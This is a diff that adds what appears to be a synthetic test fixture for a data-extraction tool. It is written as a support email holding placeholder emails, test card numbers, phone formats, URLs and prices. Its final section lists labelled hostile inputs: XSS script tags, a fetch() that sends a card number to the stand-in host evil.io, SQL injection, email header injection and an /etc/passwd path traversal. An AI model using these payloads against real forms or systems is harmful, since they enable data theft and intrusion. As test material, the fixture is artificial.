@@ -1,0 +1,66 @@
+Subject: Re: Payment issue + account access - URGENT
+
+Hi team,
+
+Following up on ticket #4471. Customer (jane.doe+billing@gmail.com) says her
+card was charged twice last week. She reached out from her personal email
+jane_doe1990@yahoo.com but our records also show j.doe@ALUEDUCATION.COM on
+file from when she was a student.
+
+Card on file (please mask before this goes anywhere): 4539 1488 0343 6467
+She also mentioned a second card ending differently: 5555-4444-3333-1111
+and a third one she read out over the phone with no separators: 4111111111111111
+
+Contact numbers we have for her:
+   +250 788 123 456 (primary, Rwanda)
+   078-812-3456
+   (078) 812 3456
+   0788.123.456
+Not a valid number, keep for reference: 123-45 (too short, do not extract)
+
+She originally registered with the alumni network using
+jane.doe@alumni.alueducation.com and later got added to a special
+initiative under si.alueducation.com as JDoe@si.alueducation.com — note
+the mixed casing, that's how it came through the export.
+
+Also flagging a garbage row from the same CSV export, looks corrupted:
+not-an-email@@@..com, alsoNotReal@nodot, @missingusername.com
+
+--------------------------------------------------------------------------------
+CHAT SUPPORT LOG (pasted directly from customer support)
+--------------------------------------------------------------------------------
+
+[14:32] agent: Thanks for reaching out! I can see your ticket was opened at 2:32 PM.
+[14:33] customer: I was told someone would call me back around 09:15 or 9:15am
+[14:35] agent: Yes, our support line is open 08:00-17:00, and escalations run until 23:45.
+[09:05] customer: Still nothing? It's been since 9:05.
+
+Useful links from the same thread:
+- Docs: https://support.example.com/billing/refunds?ticket=4471&lang=en
+- Insecure test link (http, old): http://legacy.example.org/faq
+- Shortlink someone pasted: www.exmpl.io/r/9f8a (no protocol, common in the wild)
+- Malformed, missing domain: https:///broken-link
+
+Pricing mentioned in the thread:
+  Refund amount: $129.99
+  Original charge: USD 259.98
+  Someone quoted in another currency: €45,00
+  Someone typed it weird: $1,299
+
+Tags used internally: #urgent #billing-issue #ALU_Support #q3refund
+
+
+
+------------------------------------------------------------
+SUSPICIOUS / HOSTILE INPUT (mixed in as it might appear from an
+untrusted external API or a malicious form submission)
+------------------------------------------------------------
+Name: <script>alert('xss')</script>
+Comment: '; DROP TABLE users; --
+Fake email trying to look valid: admin@bank.com<script>fetch('http://evil.io/steal?c=4111111111111111')</script>
+Header injection attempt: To: victim@example.com%0ABcc:attacker@evil.com
+Oversized junk field: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Path traversal style string: ../../../../etc/passwd
+Another card-looking string embedded in script tags: <img src=x onerror="steal('5105105105105100')">
+
+That is the end of the export. Please lets work on this. Many Thanks guys!
